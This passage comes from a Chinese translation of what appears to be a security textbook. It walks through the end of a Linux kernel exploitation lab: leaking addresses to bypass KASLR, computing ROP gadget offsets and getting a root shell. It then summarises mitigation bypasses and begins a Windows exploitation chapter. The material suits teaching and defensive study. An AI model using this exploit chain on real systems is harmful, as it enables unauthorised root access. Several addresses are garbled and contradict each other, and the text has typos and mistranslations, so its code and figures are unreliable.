
# 修改 `leak.c` 程序

- 修改 `leak.c` 程序在发送 payload 之前运行 `getchar()`。这将为我们提供时间连接 GDB（如果已经连接则断开 GDB）并确认地址是否可靠。然后在添加 `getchar()` 后重新编译 `leak.c`。代码看起来如下：

```c
getchar();
write(fd, payload, sizeof(payload));
```

```bash
$ gcc -O0 -static ~/GHv6/ch12/shared/leak.c 
-o ~/GHv6/ch12/shared/leak
```

## 2. 执行进程几次，以确认我们尝试的地址始终指向同一指令

```bash
$ ./run5.sh
~ ./leak
0xffffbc9a800a7eb0
0x6c3781c4cd01e0
0xffff9b880197f00
0xffffbc9a800a7ed0
xffffff8eb4174
```

现在，打开一个新终端并使用 GDB 命令 `x/i` 获取这些地址指向的指令：

```bash
gef x/i 0xffffffeb4174
0xffffffeb4174: mov edx, 0xffffffff
f x/i 0xffffff9f9c174
0xffffff9f9c174: mov 0xffffffff
```

既然我们的可靠地址是 `leak` 数组中的索引 4，让我们继续在禁用 KASLR（`run4.sh`）的情况下工作以简化计算。我们接下来的步骤如下：

### 1. 启动 `run4.sh`，然后通过读取 `/proc/kallsyms` 的第一行并减去 `./leak` 二进制返回的第五个地址来获取内核基地址

再次获取泄露地址与内核基之间的距离：

```
$ ./run4.sh
~ head -nl /proc/kallsyms
ffffffff81000000 T startup_64
~ ./leak
0xfffffc90000a7eb0
0xb590a89d904500
0xffff88002196f00
0xfffffc90000a7ed0
0xffffff8114c174
```

然后，退出 QEMU 并使用 Python 获取泄露地址与内核基之间的距离：

```
$ python -c 'print(hex(0xffffffffff14c174-0xffffffff81000000))'
0x14c174L
```

## 2. 修改我们的 `exploit4c` 源代码以创建一个新的无符号长整型变量 `kernel_base`，其值为 `leak[4] - 0x14c174`

代码应该如下所示：

```
unsigned long canary = leak[1];
unsigned long kernel_base = leak[4] - 0x14c174;
printf("Kernel Base = 0x%x\n", kernel_base);
printf("Canary = 0x%x\n", canary);
```

## 3. 计算每个静态地址相对于内核基的距离

让我们先固定 `pop rdi; ret;` `getget`（`gadget`），之后你可以对所有 `gadget` 重复相同的过程。

在禁用 KASLR 的情况下打开 QEMU（运行 `run4.sh`）并附加 GDB 后，从 `pop rdi; ret;` `gadget` 的地址（`0xffffffffff81ad2ec`）中减去内核基地址（`0xffffffffff81000000`）：

```
$ gdb ~/GHHv6/ch12/vmlinux
ge> target remote :1234
gef> p 0xffffffff881ad2ec-0xffffffff881000000
$1 = 0x1ad2ec
```

修改 `exploit` 代码，代码应该如下所示：

```
payload[4] = kernel_base + 0x1ad2ec; // pop rdi; ret;
```

一旦你完成了相对地址，`exploit` 源代码应该像 `~/GHHv6/ch12/shared/exploit5/exploit.c` 中的那样。

让我们编译并执行我们的 `exploit`：

```
$ gcc -O0 -static ~/GHHv6/ch12/shared/exploit5/exploit.c \
-o ~/GHHv6/ch12/shared/exploit5/exploit
./run.sh
$ ./exploit/exploit
Kernel Base = 0xffffffff97e00000
Canary = 0x28050c99dcbcfd00
/bin/sh: can't access tty; job control turned off
/home/user # id
uid=0(root) gid=0(root)
```

### 总结

在本章中，我们使用了一个漏洞内核模块和不同的内核配置，遍历了多个漏洞缓解措施以及绕过它们的一些方法。针对一个未保护的内核运行了一个简单的 `ret2usr` `exploit`，以理解内核利用的基础知识。然后，我们开始添加 Stack Canaries、SMEP、KPTI、SMAP 和 ASLR 漏洞缓解功能，并演示了一些绕过它们的技术。

这些内核利用技术提供了一个实用的知识库，帮助开始识别内核攻击向量、发现安全漏洞并理解可能的利用链，以实现对漏洞系统的完全控制。保护技术在不断变化，对抗它们的策略也在不断演进，因此为了更好地理解这些技术，你可以回顾“扩展阅读”章节。

# 扩展阅读

与 Linux 内核安全和利用相关的链接集：`github.com/xairy/linux-kernel-exploitation`

《Linux Kernel Programming: A comprehensive guide to kernel internals, writing kernel modules, and kernel synchronization》，作者 Kaiwan N Billiora (Packt Publishing, 2021)

《A Guide to Kernel Exploitation: Attacking the Core》，作者 Enrico Perla 和 Massimiliano Oldani (Elsevier, 2011)

### 参考文献

+ 1. https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux

2. https://elixir.bootlin.com/linux/v5.14.17/source/kernel/cred.c#L447

3. https://lwn.net/Articles/517251

4. https://lwn.net/Articles/804849/

5. https://lwn.net/Articles/569635/

# Windows 漏洞利用

在本章中，我们涵盖了以下主题：

- 编译和调试 Windows 程序
- 编写 Windows `exploit`
- 理解结构化异常处理 (`SEH`)
- 理解并绕过如 `SafeSEH` 等基础漏洞缓解措施
- 返回导向编程 (`ROP`)

微软 Windows 是目前最常用的操作系统，无论是专业还是个人使用，如图 13-1 所示。图中所示的百分比经常变化；但它提供了一个整体市场份额的良好参考。在编写时，Windows 10 占据了 67% 的市场，Windows 7 正在缓慢下降，但仍占据近 20% 的市场。在通用利用和寻找 0 日期漏洞方面，哪些操作系统可能具有价值应该是显而易见的。与 Windows 10 相比，Windows 7 通常是一个更容易攻击的目标，因为 Windows 7 不支持某些安全功能和缓解措施。显著特性和缓解措施的示例将在本章后续部分和第 14 章给出。Windows 11 的市场份额在未来几年内可能会大幅增加。

# 实验 13-1：在 Windows 上编译

Windows 操作系统版本不包含开发工具，但幸运的是 Visual Studio Community 允许你出于教育等目的编译程序。（如果你已经有了授权副本，请随时使用 Visual Studio 2022 进行本实验）。微软 C/C++ 优化编译器和链接器可以从 https://visual.microsoft.com/vs/community/ 免费获取。从之前的链接下载并运行安装程序。在提示时，从“工作负载 (Workloads)”类别中选择“使用 C++ 的桌面开发”选项，并取消以下所有其他选项：

- MSVC v142 – VS 2019 C++ x64/x86 生成工具
- Windows 10 SDK (10.0.19041)

# Windows 编译器选项

如果你输入 `cl.exe /`，你会得到一大编译器选项。然而，大多数在此时对我们并不感兴趣。表 13-1 列出了并描述了本章中将使用的标志。

| 选项 | 说明 |
| --- | --- |
